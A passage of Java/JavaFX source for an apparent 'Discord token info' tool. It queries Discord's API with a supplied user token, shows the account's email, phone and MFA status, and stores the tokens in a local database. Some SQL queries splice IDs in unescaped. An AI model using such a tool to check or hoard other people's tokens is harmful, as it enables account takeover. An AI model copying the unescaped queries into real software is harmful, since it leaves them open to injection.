							jsonstrPublicFlags_formatted = "Unknown";
							break;
						}

						ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
						ScriptContext context = engine.getContext();
						StringWriter writer = new StringWriter();
						context.setWriter(writer);

						engine.eval("function convertIDtoUnix(id) {\r\n" + "		/* Note: id has to be str */\r\n"
								+ "		var bin = (+id).toString(2);\r\n" + "		var unixbin = '';\r\n"
								+ "		var unix = '';\r\n" + "		var m = 64 - bin.length;\r\n"
								+ "		unixbin = bin.substring(0, 42-m);\r\n"
								+ "		unix = parseInt(unixbin, 2) + 1420070400000;\r\n"
								+ "		return unix / 1000;\r\n" + "	}" + "function convert(id) {\r\n"
								+ "		var unix = convertIDtoUnix(id.toString());\r\n" + "        \r\n"
								+ "		// Unixtimestamp\r\n" + "		 var unixtimestamp = unix;\r\n"
								+ "		 // Months array\r\n"
								+ "		 var months_arr = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];\r\n"
								+ "		 // Convert timestamp to milliseconds\r\n"
								+ "		 var date = new Date(unixtimestamp*1000);\r\n" + "		 // Year\r\n"
								+ "		 var year = date.getFullYear();\r\n" + "		 // Month\r\n"
								+ "		 var month = months_arr[date.getMonth()];\r\n" + "		 // Day\r\n"
								+ "		 var day = date.getDate();\r\n" + "		 // Hours\r\n"
								+ "		 var hours = date.getHours();\r\n" + "		 // Minutes\r\n"
								+ "		 var minutes = \"0\" + date.getMinutes();\r\n" + "		 // Seconds\r\n"
								+ "		 var seconds = \"0\" + date.getSeconds();\r\n"
								+ "		 // Display date time in MM-dd-yyyy h:m:s format\r\n"
								+ "		 var convdataTime = day+'-'+month+'-'+year+' '+ hours + ':' + minutes.substr(-2) + ':' + seconds.substr(-2);\r\n"
								+ "		 \r\n" + "		return convdataTime;\r\n" + "		\r\n" + "	}"
								+ "print(convert(" + jsonstrId + "));");

						String output = writer.toString();

						// System.out.println("Script output: " + output);

						jsonstrAccCreated = output;

						lastgettokeninfoid = jsonstrId;
						lastgettokeninfousername = jsonstrUsername + "#" + jsonstrDiscriminator;
						lastgettokeninfoverified = String.valueOf(jsonstrVerified);

						Platform.runLater(() -> {

							lblusername.setText("Username: " + jsonstrUsername + "#" + jsonstrDiscriminator);
							lbllocale.setText("Locale: " + jsonstrLocale);
							lblid.setText("ID: " + jsonstrId);
							lbltoken.setText("Token: " + jsonstrToken);
							lblphone.setText("Phone: " + jsonstrPhone);
							lblemail.setText("E-Mail: " + jsonstrEmail);
							lblverified.setText("Verified: " + jsonstrVerified_formatted);
							lblacccreated.setText("Account created: " + jsonstrAccCreated);
							lblpublicflag.setText("Public Flag: " + jsonstrPublicFlags_formatted);
							txtbio.setText(jsonstrBio);
							lblnitro.setText("Nitro status: " + jsonstrNitro);
							lblnsfwallowed.setText("NSFW allowed: " + jsonstrNSFW);
							lblmfaenabled.setText("Multi-factor authentication: " + jsonstrMFAenabled_formatted);

							// jsonstrAvatar = null;

							if (jsonstrAvatar == null) {
								InputStream inputstreammimage = this.getClass()
										.getResourceAsStream("/application/user.png");
								jsonimage = new Image(inputstreammimage, 200, 200, false, true);

							} else {
								// The image is being loaded in the background
								// getStreamFromURL();

								BufferedImage image = null;

								String address = "https://cdn.discordapp.com/avatars/" + jsonstrId + "/" + jsonstrAvatar
										+ ".png";

								jsonimage = getImageFromURL(address);

							}

							imguseravatar.setImage(jsonimage);
							imguseravatar.setPreserveRatio(true);

						});

					}

				} catch (Exception e) {
					// TODO Auto-generated catch block
					Platform.runLater(() -> {

						Alert alert = new Alert(AlertType.ERROR);
						alert.setTitle("Error getting informations");
						alert.setHeaderText("Cannot get informations");
						alert.setContentText(e.getMessage());
						alert.showAndWait();

						panetokeninfodetails.setVisible(false);

					});
				}

				Platform.runLater(() -> {
					panetokeninfodetails.setVisible(true);
					progbarloading.setOpacity(0);
					btngettokeninfo.setDisable(false);
					txttoken.setDisable(false);
				});

				return null;
			}

		};
		panetokeninfodetails.setVisible(false);
		progbarloading.setOpacity(1);
		btngettokeninfo.setDisable(true);
		txttoken.setDisable(true);

		Thread th = new Thread(task);
		th.setDaemon(false);
		th.start();

	}

	public static String getDiscordTokenInfo(String address, String token) throws Exception {

		String response = null;

		URL url = new URL(address);
		HttpURLConnection con = (HttpURLConnection) url.openConnection();
		con.setRequestMethod("GET");

		con.setRequestProperty("Accept", "application/json");
		con.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0");

		con.setRequestProperty("Authorization", token);

		con.connect();

		int status = con.getResponseCode();

		if (status == 401) {
			return null;
		}

		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuilder content = new StringBuilder();
		while ((inputLine = in.readLine()) != null) {
			content.append(inputLine);
		}

		response = content.toString();
		String responsefull = FullResponseBuilder.getFullResponse(con);
		con.disconnect();

		return response;

	}

	public Image getImageFromURL(String address) {

		BufferedImage bimage = null;
		Image returnimage = null;

		try {
			URL url = new URL(address);
			HttpURLConnection con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
			con.setRequestProperty("User-Agent",
					"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0");

			con.connect();

			int status = con.getResponseCode();
			bimage = javax.imageio.ImageIO.read(con.getInputStream());

			BufferedImage bufferedImage = bimage;
			ImageIcon imageIcon = new ImageIcon(bufferedImage);

			java.awt.Image img1 = imageIcon.getImage();
			returnimage = javafx.embed.swing.SwingFXUtils.toFXImage(bufferedImage, null);

			con.disconnect();

		} catch (IOException e) {
			// TODO Auto-generated catch block

			// e.printStackTrace();
		}

		return returnimage;

	}

	@FXML
	void menexitclick(ActionEvent event) {
		System.exit(0);
	}

	@FXML
	void menaboutclick(ActionEvent event) {

		FlatAlert alert = new FlatAlert(AlertType.INFORMATION);

		alert.setTitle("About Open Discord Token Info");
		alert.setHeaderText("Open Discord Token Info - Version " + AppVer);
		alert.setContentText("Thank you for using Open Discord Token Info");
		alert.showAndWait();

	}

	public static boolean db_insert(String user, String token, String discordid, String time, String verified) {

		try (Connection conn = DriverManager.getConnection(db_database, db_user, db_pass)) {

			DatabaseMetaData md = conn.getMetaData();

			String[] types = { "TABLE", "SYSTEM TABLE" };

			Statement stmt = conn.createStatement();

			String createQ = "CREATE TABLE IF NOT EXISTS " + db_table
					+ "(id INT NOT NULL AUTO_INCREMENT, user TEXT, token TEXT, discordid TEXT, time TEXT, notice TEXT)";
			stmt.executeUpdate(createQ);

			String insertQ = "INSERT INTO " + db_table + " (user,token,discordid,time,notice,verified) VALUES ('"
					+ escapeSql(user) + "','" + escapeSql(token) + "','" + escapeSql(discordid) + "','"
					+ escapeSql(time) + "', '', '" + escapeSql(verified) + "'); ";
			stmt.executeUpdate(insertQ);

			// System.out.println("[INFO] [DATABASE] Inserted " + insertQ);

			return true;
		} catch (SQLException e) {
			e.printStackTrace();
			return false;
		}
	}

	public static String escapeSql(String str) {
		if (str == null) {
			return null;
		}
		return new String(str).replace("'", "''");
	}

	public void db_init() {

		// System.out.println(db_database);

		try (Connection conn = DriverManager.getConnection(db_database, db_user, db_pass)) {

			// Class.forName("org.h2.Driver");
			Statement stmt = conn.createStatement();

			String createQ = "CREATE TABLE IF NOT EXISTS " + db_table
					+ " (id INT NOT NULL AUTO_INCREMENT, user TEXT, token TEXT, discordid TEXT, time TEXT, notice TEXT, verified TEXT)";
			stmt.executeUpdate(createQ);

		} catch (SQLException e) {
			e.printStackTrace();

		}
	}

	public void db_reset() {

		try (Connection conn = DriverManager.getConnection(db_database, db_user, db_pass)) {

			Statement stmt = conn.createStatement();

			String resetQ = "DROP ALL OBJECTS";
			stmt.executeUpdate(resetQ);

		} catch (SQLException e) {
			e.printStackTrace();

		}
	}

	public void db_deleteuser(String dcid) {

		try (Connection conn = DriverManager.getConnection(db_database, db_user, db_pass)) {

			Statement stmt = conn.createStatement();

			String resetQ = "DELETE FROM TOKENS WHERE discordid='" + dcid + "'";
			stmt.executeUpdate(resetQ);

		} catch (SQLException e) {
			e.printStackTrace();

		}
	}

	private ObservableList data = FXCollections.observableArrayList();

	public void db_view() {

		try (Connection conn = DriverManager.getConnection(db_database, db_user, db_pass)) {

			// Class.forName("org.h2.Driver");

			Statement stmt = conn.createStatement();

			String selectQ = "SELECT * FROM " + db_table;
			ResultSet rs = stmt.executeQuery(selectQ);

			// Bugfix
			tvdbtokens.getColumns().clear();
			data = null;
			tvdbtokens.setItems(null);

			// tvdbtokens

			TableColumn tc_user = new TableColumn("Username");
			TableColumn tc_token = new TableColumn("Token");
			TableColumn tc_discordid = new TableColumn("Discord User-ID");
			TableColumn tc_verified = new TableColumn("Verified Account");
			TableColumn tc_time = new TableColumn("Last check");
			tvdbtokens.getColumns().clear();
			tvdbtokens.getColumns().addAll(tc_user, tc_token, tc_discordid, tc_verified, tc_time);

			tc_user.setMinWidth(150);
			tc_user.setCellValueFactory(new PropertyValueFactory<>("user"));

			tc_token.setMinWidth(340);
			tc_token.setCellValueFactory(new PropertyValueFactory<>("token"));

			tc_verified.setMinWidth(60);
			tc_verified.setCellValueFactory(new PropertyValueFactory<>("verified"));

			tc_time.setMinWidth(160);
			tc_time.setCellValueFactory(new PropertyValueFactory<>("time"));

			tc_discordid.setMinWidth(160);
			tc_discordid.setCellValueFactory(new PropertyValueFactory<>("discorduserid"));

			data = FXCollections.observableArrayList();

			while (rs.next()) {
				String token = rs.getString("token");
				String discordid = rs.getString("discordid");
				String time = rs.getString("time");
				String verified = rs.getString("verified");
				String username = rs.getString("user");

				if (verified.equals("true")) {
					verified = "Yes";
				} else {
					verified = "No";
				}

				Date date = new Date(Long.parseLong(time) * 1000L); // convert seconds to milliseconds
				SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z"); // the format of your date
				String formattedDate = dateFormat.format(date);
				time = formattedDate;

				data.add(new DiscordToken(username, token, discordid, time, verified));

				tvdbtokens.setItems(data);
			}

		} catch (Exception e) {
			e.printStackTrace();

		}

	}

	public Boolean db_existsdcid(String dcid) {

		Boolean isindb = false;

		try (Connection conn = DriverManager.getConnection(db_database, db_user, db_pass)) {

			// Class.forName("org.h2.Driver");

			Statement stmt = conn.createStatement();

			String selectQ = "SELECT * FROM " + db_table + " WHERE discordid='" + dcid + "'";
			ResultSet rs = stmt.executeQuery(selectQ);

			// System.out.println(selectQ);

			while (rs.next()) {
				String token = rs.getString("token");
				String discordid = rs.getString("discordid");
				String time = rs.getString("time");
				String verified = rs.getString("verified");
				String username = rs.getString("user");
				String notice = rs.getString("notice");

				isindb = true;
			}

		} catch (Exception e) {
			e.printStackTrace();

		}

		return isindb;
	}

}
